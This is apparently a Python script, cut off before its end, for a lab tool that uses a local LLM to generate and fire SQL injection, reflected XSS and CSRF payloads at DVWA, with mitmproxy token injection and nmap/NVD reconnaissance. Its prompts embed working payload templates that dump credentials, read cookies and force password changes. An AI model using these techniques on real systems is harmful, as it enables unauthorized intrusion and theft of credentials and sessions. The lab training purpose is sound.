#!/usr/bin/env python3
# dvwa_pentest.py - AI-Assisted DVWA Pentesting Pipeline
# Programmed By Gavin Pandha
#
# PIPELINE:
#   SSH → pull PHP source
#   → Ollama (auto-started, direct, no LiteLLM) analyses vuln + generates payloads
#   → LOW/MEDIUM : direct requests.Session
#     HIGH       : mitmproxy intercepts every packet before forwarding
#   → execute payloads, check success indicators
#   → enumerate on first confirmed success (SQLI: UNION SELECT, XSS: Selenium)
#   → generate report + download from Gradio
#
# INSTALL:
#   pip install gradio paramiko requests beautifulsoup4 mitmproxy selenium webdriver-manager
#
# PREREQS:
#   ollama pull qwen3-coder:30b   (once, before first run)
#   sudo apt install -y nmap      (on Kali)

# =============================================================================
# IMPORTS
# =============================================================================
import atexit
import json
import re
import signal
import socket
import subprocess
import sys
import threading
import time
import shutil
import xml.etree.ElementTree as ET
from datetime import datetime
from urllib.parse import quote, urlencode

import gradio as gr
import paramiko
import requests
from bs4 import BeautifulSoup

# Selenium — used for XSS enumeration (JS execution)
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.select import Select
from selenium.webdriver.support.ui import WebDriverWait
from selenium.common.exceptions import NoSuchElementException, TimeoutException

try:
    from webdriver_manager.chrome import ChromeDriverManager
    from selenium.webdriver.chrome.service import Service
    WEBDRIVER_MANAGER = True
except ImportError:
    WEBDRIVER_MANAGER = False

# mitmproxy — used for HIGH level packet interception
try:
    from mitmproxy import http as mhttp
    from mitmproxy.tools.dump import DumpMaster
    from mitmproxy.options import Options
    MITMPROXY = True
except ImportError:
    MITMPROXY = False
    print("[WARNING] mitmproxy not installed — HIGH level interception unavailable.")
    print("          pip install mitmproxy")

# =============================================================================
# WINDOWS PATH FIX FOR MITMPROXY — ROBUST VERSION
# =============================================================================
import os
import subprocess

def _fix_mitmproxy_path():
    if not sys.platform == "win32":
        return

    print("[PATH FIX] Starting aggressive mitmdump location search...")

    # 1. Already in PATH?
    if shutil.which("mitmdump") or shutil.which("mitmdump.exe"):
        print("[PATH FIX] mitmdump already found in PATH")
        return

    # 2. Discover exact location using pip show (most reliable)
    try:
        result = subprocess.run(
            [sys.executable, "-m", "pip", "show", "mitmproxy"],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            for line in result.stdout.splitlines():
                if line.startswith("Location:"):
                    location = line.split(":", 1)[1].strip()
                    scripts_dir = os.path.join(location, "..", "Scripts").replace("\\", "/")
                    if os.path.isdir(scripts_dir):
                        os.environ["PATH"] = scripts_dir + os.pathsep + os.environ.get("PATH", "")
                        print(f"[PATH FIX] Added via pip show: {scripts_dir}")
                        return
    except Exception as e:
        print(f"[PATH FIX] pip show failed: {e}")

    # 3. Common Windows Python locations (including yours)
    python_dir = os.path.dirname(sys.executable)
    common_paths = [
        os.path.join(python_dir, "Scripts"),
        os.path.join(os.getenv("APPDATA", ""), "Python", f"Python{sys.version.split()[0][:3].replace('.', '')}", "Scripts"),
        r"C:\Users\gpandha\AppData\Local\Programs\Python\Python312\Scripts",
        r"C:\Users\gpandha\AppData\Local\Programs\Python\Python311\Scripts",
        r"C:\Users\gpandha\AppData\Local\Programs\Python\Python310\Scripts",
    ]

    for p in common_paths:
        if os.path.isdir(p) and p not in os.environ.get("PATH", ""):
            os.environ["PATH"] = p + os.pathsep + os.environ.get("PATH", "")
            print(f"[PATH FIX] Added common path: {p}")

    # 4. Final check
    mitm = shutil.which("mitmdump") or shutil.which("mitmdump.exe")
    if mitm:
        print(f"[PATH FIX] SUCCESS — mitmdump found at: {mitm}")
    else:
        print("[PATH FIX] WARNING — still not found. Check your pip install location.")

_fix_mitmproxy_path()


# =============================================================================
# CONFIG
# =============================================================================
DEFAULT_CONFIG = {
    "kali_ip":      "192.168.56.101",
    "ssh_user":     "kali",
    "ssh_key":      r"C:\Users\gpandha\kali_ssh",
    "windows_username": "gpandha",
    "dvwa_user":    "admin",
    "dvwa_pass":    "password",
    "ollama_model": "qwen3-coder:30b", # "qwen2.5-coder:3b"
    "ollama_url":   "http://localhost:11434/api/chat",
    "proxy_port":   8888,
    "error_log":    "dvwa_errors.log",
}

PHP_PATHS = {
    "SQLI": "/var/www/html/DVWA/vulnerabilities/sqli/source/{level}.php",
    "XSS":  "/var/www/html/DVWA/vulnerabilities/xss_r/source/{level}.php",
    "CSRF": "/var/www/html/DVWA/vulnerabilities/csrf/source/{level}.php",
}

ENDPOINTS = {
    "SQLI":         "/DVWA/vulnerabilities/sqli/",
    "XSS":          "/DVWA/vulnerabilities/xss_r/",
    "CSRF":         "/DVWA/vulnerabilities/csrf/",
    "SQLI_SESSION": "/DVWA/vulnerabilities/sqli/session-input.php",
}

LEVEL_CONTEXT = {
    "SQLI": {
        "low":    "No sanitization at all. Direct quote injection works. Standard UNION SELECT applies.",
        "medium": "mysql_real_escape_string escapes quotes. Use integer-based UNION SELECT (no quotes around injected value).",
        "high":   "Input comes from $_SESSION['id'], set by session-input.php via POST. The session value is interpolated directly into the SQL query with no sanitization. Submit payload to session-input.php first via POST, then GET the main page.",
    },
    "XSS": {
        "low":    "No sanitization. Any tag or event handler reflects and executes.",
        "medium": "strip_tags() removes complete HTML tags but NOT event handler attributes. Inject event handlers on plain text.",
        "high":   "preg_replace strips the word 'script' (case-insensitive). It does NOT strip event handlers or non-script tags. Use <img onerror>, <svg onload>, <body onload>, <iframe src=javascript:>.",
    },
    "CSRF": {
        "low":    "No token, no referrer check. Any authenticated GET request succeeds.",
        "medium": "Checks HTTP Referer header only. No token. Spoof the Referer to bypass.",
        "high":   "Requires a valid user_token from $_SESSION['session_token']. Fetch a fresh token before each request. Requests without a valid token will fail — this is the expected defence.",
    },
}

# =============================================================================
# MITMPROXY INTERCEPTOR — active request/response modification
# =============================================================================
import asyncio
from mitmproxy import http as mhttp
from mitmproxy.tools.dump import DumpMaster
from mitmproxy.options import Options

class DVWAInterceptor:
    """
    Active mitmproxy addon. For each level:
      SQLI  — logs POST to session-input.php, shows payload in-flight
      XSS   — flags unescaped event handlers in reflected responses
      CSRF  — extracts user_token from responses, injects into exploit requests
    """
    def __init__(self):
        from collections import deque
        self.captured = deque(maxlen=1000)   # bounded memory
        self.active_vuln     = None
        self.active_level    = None
        self.extracted_token = None
        self.inject_token    = False   # when True, next CSRF request gets token injected

    def request(self, flow: mhttp.HTTPFlow):
        """
        Called before the request is sent to the server.
        Use url_lower for case-insensitive checks.
        Optionally mutate request.query or request.text here.
        """
        url = flow.request.pretty_url or ""
        url_lower = url.lower()

        # ── SQLI: log session-input.php POST in-flight (case-insensitive)
        if self.active_vuln == "SQLI" and "session-input.php" in url_lower:
            body = flow.request.get_text() if hasattr(flow.request, "get_text") else (flow.request.text or "")
            self.captured.append({
                "event":    "SQLI_SESSION_POST",
                "method":   flow.request.method,
                "url":      url,
                "req_body": body[:1000],
                "note":     "Payload delivered to session-input.php — will be interpolated into SQL query",
            })

            # Example: You can mutate the posted id before it reaches the server.
            # Uncomment and adapt if you want automatic mutation:
            # try:
            #     if flow.request.urlencoded_form:
            #         form = dict(flow.request.urlencoded_form)
            #         if "id" in form:
            #             original = form["id"]
            #             mutated = original + "/*proxy*/"   # example mutation
            #             flow.request.urlencoded_form["id"] = mutated
            #             self.captured.append({"event":"SQLI_SESSION_MUTATED","original":original,"mutated":mutated})
            # except Exception:
            #     pass

        # ── CSRF: inject extracted token into exploit request (case-insensitive)
        if self.active_vuln == "CSRF" and self.inject_token and self.extracted_token:
            # check path portion for 'csrf' to cover various endpoints
            if "csrf" in url_lower and flow.request.method == "GET":
                try:
                    qs = dict(flow.request.query)
                    if "user_token" not in qs:
                        # mutate query in-place — mitmproxy supports this
                        flow.request.query["user_token"] = self.extracted_token
                        self.captured.append({
                            "event":  "CSRF_TOKEN_INJECTED",
                            "method": flow.request.method,
                            "url":    url,
                            "note":   f"Token {self.extracted_token[:16]}... injected by interceptor",
                        })
                except Exception:
                    # defensive: some flow.request.query objects may behave differently
                    pass

    def response(self, flow: mhttp.HTTPFlow):
        """
        Called after the server sends a response back to the client.
        Normalizes URL, extracts tokens, detects reflected XSS, and records traffic.
        """
        url  = flow.request.pretty_url or ""
        body = flow.response.get_text(strict=False) if hasattr(flow.response, "get_text") else (flow.response.text or "")

        # Normalize URL to avoid case issues
        url_lower = url.lower()

        # ── Extract CSRF token from any DVWA page response ────────────────
        try:
            token_match = re.search(
                r'name=[\'"]user_token[\'"][^>]*value=[\'"]([a-f0-9]+)[\'"]',
                body,
                re.I
            )
        except Exception:
            token_match = None

        if token_match:
            self.extracted_token = token_match.group(1)
            # record token capture for debugging (preview only)
            self.captured.append({
                "event": "CSRF_TOKEN_CAPTURED",
                "url": url,
                "token_preview": (self.extracted_token[:12] + "...") if self.extracted_token else "",
            })

        # ── XSS: detect reflected unescaped payloads ──────────────────────
        # Use a stricter detection to reduce false positives
        if self.active_vuln == "XSS" and "xss_r" in url_lower:
            try:
                # look for event handlers and javascript: usage; ensure not HTML-escaped
                xss_match = re.search(r'on\w+\s*=\s*["\']?[^"\']*(alert|document|cookie|onerror|onload|javascript:)', body, re.I)
            except Exception:
                xss_match = None

            if xss_match and "&lt;" not in body and "&gt;" not in body:
                snippet_match = re.search(r'.{0,80}on\w+\s*=\s*["\']?[^"\'>]{0,80}', body, re.I)
                snippet = snippet_match.group(0) if snippet_match else ""

                self.captured.append({
                    "event":  "XSS_REFLECTED_UNESCAPED",
                    "method": flow.request.method,
                    "url":    url,
                    "note":   "Unescaped event handler detected in server response at packet level",
                    "snippet": snippet,
                })

        # ── Capture ALL DVWA traffic safely (case-insensitive)
        if "/dvwa/" in url_lower:
            try:
                self.captured.append({
                    "event":    "TRAFFIC",
                    "method":   flow.request.method,
                    "url":      url,
                    "status":   getattr(flow.response, "status_code", getattr(flow.response, "status", "?")),
                    "req_body": (flow.request.text or "")[:200],
                    "res_body": body[:200],
                })
            except Exception:
                # defensive: don't let logging break the proxy
                pass


_mitm_master    = None
_mitm_thread    = None
_mitm_loop      = None
_interceptor    = None

def start_mitmproxy(port: int) -> DVWAInterceptor:
    global _mitm_master, _mitm_thread, _mitm_loop, _interceptor

    # If we previously started a mitmproxy and its thread is still alive, reuse it
    if _mitm_master is not None and _mitm_thread is not None and _mitm_thread.is_alive():
        # confirm the running master is actually listening on the requested port
        try:
            master_opts = getattr(_mitm_master, "options", None)
            master_port = getattr(master_opts, "listen_port", None) if master_opts is not None else None
        except Exception:
            master_port = None

        if master_port == port:
            print(f"[mitmproxy] Reusing existing interceptor (we started) on port {port}")
            return _interceptor
        else:
            # we own a mitmproxy but it listens on a different port — treat requested port as unavailable
            if _is_port_in_use(port):
                raise RuntimeError(f"Port {port} is in use by another process; cannot start mitmproxy on this port.")

    _interceptor = DVWAInterceptor()

    def run_loop():
        global _mitm_master, _mitm_loop
        _mitm_loop = asyncio.new_event_loop()
        asyncio.set_event_loop(_mitm_loop)

        async def _start():
            global _mitm_master
            opts = Options(listen_host="127.0.0.1", listen_port=port)
            _mitm_master = DumpMaster(opts, with_termlog=False, with_dumper=False)
            _mitm_master.addons.add(_interceptor)
            await _mitm_master.run()

        try:
            _mitm_loop.run_until_complete(_start())
        except Exception:
            pass

    _mitm_thread = threading.Thread(target=run_loop, daemon=True)
    _mitm_thread.start()

    if not _wait_for_port(port, timeout=12):
        raise RuntimeError(f"mitmproxy failed to listen on port {port}")

    print(f"[mitmproxy] Active interceptor listening on port {port}")
    return _interceptor


def stop_mitmproxy(timeout: int = 8):
    """
    Stop mitmproxy cleanly: request shutdown on the loop, join the thread,
    and clear globals so subsequent runs can start a fresh instance.
    """
    global _mitm_master, _mitm_loop, _mitm_thread, _interceptor

    if not _mitm_master and not _mitm_thread:
        return

    print("[mitmproxy] Stopping interceptor...")

    # Ask the mitm event loop to shutdown
    try:
        if _mitm_loop and _mitm_loop.is_running():
            _mitm_loop.call_soon_threadsafe(getattr(_mitm_master, "shutdown", lambda: None))
    except Exception as e:
        print(f"[mitmproxy] Shutdown call failed: {e}")

    # Wait for the thread to exit
    if _mitm_thread:
        _mitm_thread.join(timeout)
        if _mitm_thread.is_alive():
            print("[mitmproxy] Warning: mitm thread did not exit within timeout.")

    # Clear everything so next start is fresh
    _mitm_master = None
    _mitm_loop = None
    _mitm_thread = None
    _interceptor = None

    print("[mitmproxy] Interceptor stopped.")
        
# =============================================================================
# OLLAMA AUTO-START
# =============================================================================
_ollama_process = None


def _is_port_in_use(port: int) -> bool:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(("localhost", port)) == 0

def find_free_port(start=8888, attempts=20):
    for p in range(start, start + attempts):
        if not _is_port_in_use(p):
            return p
    raise RuntimeError("No free ports available")


def _wait_for_port(port: int, timeout: int = 45) -> bool:
    start = time.time()
    while time.time() - start < timeout:
        if _is_port_in_use(port):
            return True
        time.sleep(1)
    return False


def start_ollama():
    """Start Ollama if it isn't already running. Called automatically on launch."""
    global _ollama_process
    print("[Startup] Checking Ollama on port 11434...")
    if _is_port_in_use(11434):
        print("[Startup] Ollama already running.")
        return
    print("[Startup] Starting Ollama...")
    flags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
    _ollama_process = subprocess.Popen(
        ["ollama", "serve"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=flags,
    )
    if not _wait_for_port(11434, 45):
        raise RuntimeError(
            "Ollama failed to start on port 11434 after 45s.\n"
            "Try running 'ollama serve' manually in a separate terminal."
        )
    print("[Startup] Ollama ready.")


def stop_ollama():
    global _ollama_process
    if _ollama_process and _ollama_process.poll() is None:
        print("[Shutdown] Stopping Ollama...")
        _ollama_process.terminate()
        try:
            _ollama_process.wait(timeout=8)
        except Exception:
            _ollama_process.kill()
        print("[Shutdown] Ollama stopped.")



def wait_for_ollama_model(cfg: dict, timeout: int = 180):
    """Wait until the chosen model is loaded in Ollama."""
    model = cfg["ollama_model"]
    print(f"[Ollama] Waiting up to {timeout}s for model '{model}' to be ready...")
    start = time.time()
    while time.time() - start < timeout:
        try:
            r = requests.get("http://localhost:11434/api/tags", timeout=5)
            if r.status_code == 200:
                models = r.json().get("models", [])
                if any(m["name"] == model or m["name"].startswith(model.split(":")[0]) for m in models):
                    print(f"[Ollama] Model '{model}' is ready!")
                    return True
        except:
            pass
        time.sleep(3)
    raise RuntimeError(
        f"Model '{model}' not ready after {timeout}s.\n"
        f"Run this in a terminal: ollama pull {model}\n"
        f"Then wait 30-90 seconds and try again."
    )


# ensure mitmproxy and ollama are cleaned up on exit
atexit.register(stop_ollama)
atexit.register(stop_mitmproxy)
signal.signal(signal.SIGINT,  lambda s, f: (stop_ollama(), stop_mitmproxy(), sys.exit(0)))
signal.signal(signal.SIGTERM, lambda s, f: (stop_ollama(), stop_mitmproxy(), sys.exit(0)))


# =============================================================================
# SSH
# =============================================================================
def ssh_connect(cfg: dict) -> paramiko.SSHClient:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        cfg["kali_ip"],
        username=cfg["ssh_user"],
        key_filename=cfg["ssh_key"],
        timeout=30,
        allow_agent=False,
        look_for_keys=False,
    )
    return client


def ssh_run(client: paramiko.SSHClient, cmd: str, error_log: str):
    try:
        _, stdout, stderr = client.exec_command(cmd)
        out = stdout.read().decode(errors="ignore")
        err = stderr.read().decode(errors="ignore")
        if err:
            with open(error_log, "a", encoding="utf-8") as f:
                f.write(f"SSH ERR [{cmd}]: {err}\n")
        return out, err
    except Exception as e:
        return "", f"SSH exec failed: {e}"


# =============================================================================
# OLLAMA  — Ultra-robust JSON mode
# =============================================================================
def ollama_ask(prompt: str, cfg: dict, json_mode: bool = False,
               call_type: str = "default", retries: int = 6):
    """Final robust version with Ollama native JSON mode + heavy cleaning."""

    # ── Temperature by call type ──────────────────────────────────────────────
    # payload  : JSON payloads — needs variation but JSON must stay parseable
    # analysis : prose grounded in PHP source — higher temp = richer language
    # enum     : SQL enumeration — slight nudge above 0 to vary query forms
    # recon    : freeform Nmap/CVE analysis — most exploratory
    # default  : fallback for anything not explicitly typed
    # NOTE: never exceed 0.5 for json_mode calls — qwen3-coder starts injecting
    #       reasoning traces into JSON above that threshold, breaking the parser
    TEMPERATURES = {
        "payload":  0.35,
        "analysis": 0.45,
        "enum":     0.20,
        "recon":    0.40,
        "default":  0.30,
    }

    if json_mode:
        system = """Output **ONLY** valid JSON. No text before or after."""
        messages = [
            {"role": "system", "content": system},
            {"role": "user",   "content": prompt}
        ]
        # For JSON calls, cap at 0.35 regardless of call_type to protect parser
        temp = min(TEMPERATURES.get(call_type, TEMPERATURES["default"]), 0.35)
    else:
        messages = [{"role": "user", "content": prompt}]
        temp = TEMPERATURES.get(call_type, TEMPERATURES["default"])

    for attempt in range(retries):
        try:
            payload = {
                "model": cfg["ollama_model"],
                "messages": messages,
                "stream": False,
                "options": {"temperature": temp, "top_p": 0.8}
            }

            # Force native JSON mode when requested (Ollama supports this)
            if json_mode:
                payload["format"] = "json"

            r = requests.post(
                cfg["ollama_url"],
                json=payload,
                timeout=600,
            )
            r.raise_for_status()
            raw = r.json()["message"]["content"]

            print(f"[Ollama DEBUG - attempt {attempt+1}] Raw first 800 chars:\n{raw[:800]}\n")

            if not json_mode:
                return raw

            # === BULLETPROOF EXTRACTION ===
            # 1. Strip all leading junk until first { or [
            start = raw.find('{')
            if start == -1:
                start = raw.find('[')
            if start == -1:
                print("[Ollama] No JSON start found")
                continue

            candidate = raw[start:]

            # 2. Find matching end (simple brace balance)
            balance = 1 if candidate[0] in '{[' else 0
            end = -1
            for i in range(1, len(candidate)):
                if candidate[i] in '{[':
                    balance += 1
                elif candidate[i] in '}]':
                    balance -= 1
                    if balance == 0:
                        end = i + 1
                        break

            if end != -1:
                candidate = candidate[:end]

            # 3. Try parse
            try:
                parsed = json.loads(candidate)
                print("[Ollama] Parsed successfully from balanced block")
                return parsed
            except json.JSONDecodeError as e:
                print(f"[Ollama] Balanced parse failed: {e}")

            # 4. Fallback: last-ditch largest {} or []
            import re
            match = re.search(r'(\{.*\}|\[.*\])', candidate, re.DOTALL)
            if match:
                try:
                    parsed = json.loads(match.group(1))
                    print("[Ollama] Fallback largest block parsed OK")
                    return parsed
                except:
                    pass

        except Exception as e:
            print(f"[Ollama attempt {attempt+1} failed: {type(e).__name__} - {str(e)[:300]}")

        time.sleep(5)

    print("[Ollama] Giving up after all retries")
    return {} if json_mode else "[Ollama failed]"


# =============================================================================
# OLLAMA ANALYSIS PROMPT
# =============================================================================
ANALYSIS_PROMPT = """\
You are an expert penetration tester analysing DVWA source code.

Read the PHP source carefully, then output **ONE JSON report ONLY**.

=== PHP SOURCE ({vuln} - {level}) ===
{php_code}

=== LEVEL CONTEXT ===
{level_context}

=== RULES ===
- Start your response **directly** with { or [.  
- Output **nothing** except valid JSON. No explanations, no markdown, no ```json fences, no lists, no reasoning text.
- Every payload must be derivable from the actual code above.
- success_indicator must be a minimal substring that uniquely proves exploitation.
- SQLI: use 2-column UNION SELECT (the query selects first_name, last_name).
- XSS: enumeration payloads must write to DOM with document.querySelector('pre').textContent = 'XSS_RESULT::' + value
- CSRF: payload is JSON of form parameters. If token defense works, set likelihood=low and impact=mitigated.
- SQLI HIGH: note that payload goes via session-input.php first.
- Cite exact vulnerable line(s) in vulnerable_pattern.

Output ONLY this exact JSON structure:

{{
  "vuln": "{vuln}",
  "level": "{level}",
  "vulnerable_pattern": "exact quoted line(s) from source",
  "defense_mechanism": "what the code does or does not do",
  "why_vulnerable": "concise paragraph grounded in the code",
  "owasp": "e.g. A05:2025 Injection",
  "mitre": "e.g. T1190",
  "impact": "what an attacker gains",
  "likelihood": "high / medium / low — one-line reason",
  "payloads": [ {{ "payload": "...", "description": "...", "success_indicator": "..." }} ],
  "enumeration": [ {{ "stage": "...", "payload": "...", "success_indicator": "..." }} ],
  "remediation": {{ "fixed_php": "...", "mitigations": ["...", "..."] }}
}}
"""


def build_analysis_prompt(vuln: str, level: str, php_code: str) -> str:
    level_context = LEVEL_CONTEXT.get(vuln, {}).get(level, "Standard controls apply.")
    return f"""You are an expert penetration tester analysing DVWA source code.
Read the PHP source carefully and write a qualitative security analysis report section.

=== PHP SOURCE ({vuln} - {level.upper()}) ===
{php_code}

=== LEVEL CONTEXT ===
{level_context}

Write your analysis in plain prose under these headings exactly:

VULNERABLE PATTERN:
(quote the exact vulnerable line(s) from the source)

DEFENSE MECHANISM:
(what the code does or does not do to prevent exploitation)

WHY VULNERABLE:
(concise paragraph grounded in the actual code)

OWASP Top 10 2025:
(Use the OWASP Top 10 2025 categories exactly:
 A01:2025 Broken Access Control,
 A02:2025 Security Misconfiguration,
 A03:2025 Software Supply Chain Failures,
 A04:2025 Cryptographic Failures,
 A05:2025 Injection (covers SQLI, XSS, and other injections),
 A06:2025 Insecure Design,
 A07:2025 Identification and Authentication Failures (covers CSRF, broken auth),
 A08:2025 Data Integrity Failures,
 A09:2025 Vulnerable and Outdated Components,
 A10:2025 Mishandling of Exceptional Conditions.
 Choose the single most accurate. For SQLI/XSS = A05:2025 Injection, CSRF = A01:2025 Identification and Authentication Failures.)

MITRE ATT&CK:
(Select the most accurate technique ID and name from the MITRE ATT&CK framework for this
 specific vulnerability. Consider: T1190 Exploit Public-Facing Application, T1185 Browser Session Hijacking, T1059 Command and Scripting Interpreter, T1539 Steal Web Session Cookie, T1110 Brute Force, T1552 Unsecured CredentialsT1185 Browser Session Hijacking, T1185 Command
 and Scripting Interpreter, T1552 Unsecured Credentials, T1185 Browser Session Hijacking,
 T1539 Steal Web Session Cookie, T1110 Brute Force. Choose based on the actual attack
 vector in the code, not a generic answer.)

CWE:
(Select the most accurate CWE ID and name, e.g. CWE-89 SQL Injection, CWE-79 XSS,
 CWE-352 CSRF. Choose based on the root cause in the code.)

IMPACT:
(what an attacker gains)

LIKELIHOOD:
(high / medium / low with a one-line reason)

REMEDIATION:
(fixed PHP snippet and bullet-point mitigations)

Write clearly. No JSON. No markdown fences. Just the headings and prose."""


def build_payload_prompt(vuln: str, level: str, php_code: str) -> str:
    level_context = LEVEL_CONTEXT.get(vuln, {}).get(level, "Standard controls apply.")

    vuln_rules = {
        "SQLI": """
- Generate exactly 5 varied UNION SELECT payloads. Do NOT generate OR-based boolean payloads.
- Each payload extracts different data: version, database name, table names, column names, credentials.
- All payloads MUST use exactly 2 columns. Never pad with NULL — put real data in BOTH columns.
- First name column = first value, Surname column = second value.
- For single-value queries put a label in the second column e.g. ' UNION SELECT version(),'db_version'-- -
- For credentials use: ' UNION SELECT user, password FROM users-- -
- Use -- - as the comment terminator. Never use -- or # alone.
- This is MySQL/MariaDB only. Use ONLY these functions:
  database(), version(), group_concat(), information_schema.tables, information_schema.columns
- Never use @@version, database_name(), or any SQL Server syntax.
- Never use placeholder values. Use database() dynamically instead of hardcoding a database name.
- For HIGH level, payloads are POSTed to session-input.php before the main page is GET requested.
- success_indicator must be 'Surname:' — it only appears when data is successfully leaked.
- Also generate 3 enumeration stages under key 'enumeration', progressively deeper: version → tables → credentials.""",

        "XSS": """
- Generate exactly 4 varied payloads using different HTML elements and event handlers. Absolutely no <script> tags.
- Each payload must use a completely different tag or event handler from the others.
- success_indicator must be the reflected attribute text visible in raw HTML e.g. 'onerror=' not 'alert'.
- Also generate 3 enumeration stages under the key 'enumeration' that extract real browser data.
- Each enumeration payload MUST write output to the DOM using exactly this pattern:
  <img src=x onerror="document.querySelector('pre').textContent='XSS_RESULT::'+document.cookie">
  Replace document.cookie with the target data for each stage (cookie, userAgent, location.href).
- Do NOT use console.log — it does not write to the DOM and cannot be captured.""",

        "CSRF": """
- Generate exactly 3 payloads each testing a different token bypass strategy.
- Each payload value must be a valid JSON string containing ONLY these exact keys:
  password_new, password_conf, Change — with real string values, no placeholders.
- Do NOT include user_token, SESSION_TOKEN, HTTP_USER_TOKEN, or any placeholder text in the payload value.
  The execution engine handles token injection separately.
- Example valid payload: {"password_new":"hacked123","password_conf":"hacked123","Change":"Change"}
- success_indicator must be 'Password Changed' for expected success or 'Request Failed' for expected failure.
- Also generate 2 enumeration stages under key 'enumeration'.""",
    }

    return f"""You are an expert penetration tester. Generate exploitation payloads for this DVWA vulnerability.

=== PHP SOURCE ({vuln} - {level.upper()}) ===
{php_code}

=== LEVEL CONTEXT ===
{level_context}

=== RULES FOR {vuln} ===
{vuln_rules.get(vuln, "Generate 3-5 varied payloads targeting different aspects of the vulnerability.")}

Output ONLY a JSON object with exactly two keys: payloads and enumeration.
No text before or after. No markdown. No explanation.
Each payload object must have exactly: payload, description, success_indicator.
Each enumeration object must have exactly: stage, payload, success_indicator.

{{
  "payloads": [
    {{"payload": "...", "description": "...", "success_indicator": "..."}}
  ],
  "enumeration": [
    {{"stage": "...", "payload": "...", "success_indicator": "..."}}
  ]
}}

Output the JSON now:"""


# =============================================================================
# NMAP + NVD + NSE RECON
# =============================================================================
def run_recon(client: paramiko.SSHClient, kali_ip: str, cfg: dict, error_log: str) -> str:
    report  = "Network Reconnaissance\n"
    report += "======================\n\n"

    out, err = ssh_run(client, f"nmap -sV -p 1-1000 -oX - {kali_ip}", error_log)
    if not out.strip():
        return report + f"Nmap failed: {err}\n"

    services = []
    try:
        root = ET.fromstring(out)
        for port in root.findall(".//port"):
            if port.find("state").attrib.get("state") != "open":
                continue
            svc  = port.find("service")
            cpes = [c.text for c in svc.findall("cpe")] if svc is not None else []
            services.append({
                "port":    port.attrib.get("portid"),
                "name":    svc.attrib.get("name",    "unknown") if svc is not None else "unknown",
                "product": svc.attrib.get("product", "")        if svc is not None else "",
                "version": svc.attrib.get("version", "")        if svc is not None else "",
                "cpes":    cpes,
            })
    except Exception as e:
        return report + f"XML parse error: {e}\n"

    report += "Open Services:\n"
    for s in services:
        report += f"  {s['port']}/tcp  {s['name']}  {s['product']}  {s['version']}\n"

    enriched = []
    nvd_hdr  = {"User-Agent": "DVWA-Pentest/1.0"}
    for s in services:
        cves = []
        for cpe in s["cpes"]:
            try:
                time.sleep(1.2)
                r = requests.get(
                    f"https://services.nvd.nist.gov/rest/json/cves/2.0"
                    f"?cpeName={quote(cpe)}&resultsPerPage=5",
                    headers=nvd_hdr, timeout=12,
                )
                if r.status_code == 200:
                    for v in r.json().get("vulnerabilities", [])[:3]:
                        cves.append({
                            "id":   v["cve"]["id"],
                            "desc": v["cve"]["descriptions"][0]["value"][:220],
                        })
            except Exception:
                pass
        if not cves:
            q = quote(" ".join(filter(None, [s["name"], s["product"], s["version"]])))
            try:
                time.sleep(1.2)
                r = requests.get(
                    f"https://services.nvd.nist.gov/rest/json/cves/2.0"
                    f"?keywordSearch={q}&resultsPerPage=5",
                    headers=nvd_hdr, timeout=12,
                )
                if r.status_code == 200:
                    for v in r.json().get("vulnerabilities", [])[:3]:
                        cves.append({
                            "id":   v["cve"]["id"],
                            "desc": v["cve"]["descriptions"][0]["value"][:220],
                        })
            except Exception:
                pass
        enriched.append({**s, "cves": cves})

    report += "\nNVD CVE Matches:\n"
    for s in enriched:
        report += f"\n  {s['port']}/tcp  {s['name']}  {s['product']}  {s['version']}\n"
        for c in s["cves"]:
            report += f"    [{c['id']}] {c['desc']}\n"
        if not s["cves"]:
            report += "    No CVEs found.\n"

    nse_out, _ = ssh_run(
        client, "ls /usr/share/nmap/scripts/*.nse | xargs -n1 basename", error_log
    )
    all_scripts = [ln.strip() for ln in nse_out.splitlines() if ln.strip()]
    suggestions = sorted({
        sc for s in services for sc in all_scripts
        if any(x and x in sc.lower() for x in [s["name"].lower(), s["product"].lower()])
    })[:15]

    report += "\nSuggested NSE Scripts:\n"
    for sc in suggestions:
        report += f"  - {sc}\n"

    ports_str = ",".join(sorted(set(s["port"] for s in services)))
    llm_out   = ollama_ask(
        f"""You are an experienced penetration tester.
Open services: {json.dumps(services, indent=2)}
NVD CVEs: {json.dumps(enriched, indent=2)}
NSE suggestions: {json.dumps(suggestions, indent=2)}

1. Rank services by exploitability.
2. Recommend top NSE scripts from the list.
3. Output exact nmap command: nmap -sV -p {ports_str} --script=... {kali_ip}
4. List manual follow-up steps.
Be concise.""",
        cfg,
        json_mode=False,   # ← IMPORTANT
        call_type="recon"
    )
    report += "\nOllama Recon Analysis:\n" + llm_out + "\n"
    return report


# =============================================================================
# DVWA SESSION
# =============================================================================
def dvwa_login(cfg: dict, proxies: dict = None) -> requests.Session:
    base = f"http://{cfg['kali_ip']}"
    s    = requests.Session()
    if proxies:
        s.proxies = proxies
        s.verify  = False

    r    = s.get(f"{base}/DVWA/login.php", timeout=10)
    soup = BeautifulSoup(r.text, "html.parser")
    tag  = soup.find("input", {"name": "user_token"})
    tok  = tag["value"] if tag else ""

    r = s.post(f"{base}/DVWA/login.php", data={
        "username":   cfg["dvwa_user"],
        "password":   cfg["dvwa_pass"],
        "Login":      "Login",
        "user_token": tok,
    }, timeout=10)

    if "logout" not in r.text.lower():
        raise Exception("DVWA login failed — check credentials or DVWA status")
    return s


def dvwa_set_level(session: requests.Session, level: str, cfg: dict):
    base = f"http://{cfg['kali_ip']}"
    r    = session.get(f"{base}/DVWA/security.php", timeout=10)
    soup = BeautifulSoup(r.text, "html.parser")
    tag  = soup.find("input", {"name": "user_token"})
    tok  = tag["value"] if tag else ""
    session.post(f"{base}/DVWA/security.php", data={
        "security":      level,
        "seclev_submit": "Submit",
        "user_token":    tok,
    }, timeout=10)


# =============================================================================
# PACKET INTERCEPTOR  (mitmproxy)
# =============================================================================
# Activated for HIGH security level only.
# Every DVWA request passes through this proxy before reaching the server.
# inject_callback(flow) lets you read/modify headers, body, or query params.
# All responses are stored in self.captured for post-execution review.
# =============================================================================


# =============================================================================
# SELENIUM HELPERS  (XSS enumeration — needs real JS engine)
# =============================================================================
def selenium_setup(proxy_port=None):
